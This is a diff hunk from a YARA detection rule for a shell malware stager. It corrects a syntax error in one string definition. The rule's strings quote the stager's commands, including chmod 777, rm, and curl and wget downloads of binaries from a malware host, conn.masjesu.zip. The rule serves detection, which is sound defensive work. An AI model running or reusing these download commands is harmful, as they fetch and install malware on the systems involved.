@@ -11,7 +11,7 @@ rule MAL__SH_Stager_551d759edf7b3bb85f8e15e4ec18b68fbd2806ca78b0d0c06c487410de5d
 		$a3 = "chmod 777 duZwkigPpaJ3uN7ugZYexOiTouauYGw3ZH;"
 		$a4 = "rm PtthzTjmGz6hiD8IdfUESj7v7l5UaXj5GM"
 		$a5 = "curl -O  http://conn.masjesu.zip/bins/6Vt065JrwtiKTlzzojZHt3gYUH3tmpJMnA;/bin/busybox"
-		$a6 - "wget http://conn.masjesu.zip/bins/Vcq16M8p4zPrCNcNCT7K8eX3WaRZYavDAk"
+		$a6 = "wget http://conn.masjesu.zip/bins/Vcq16M8p4zPrCNcNCT7K8eX3WaRZYavDAk"
 		
 	condition:
 	
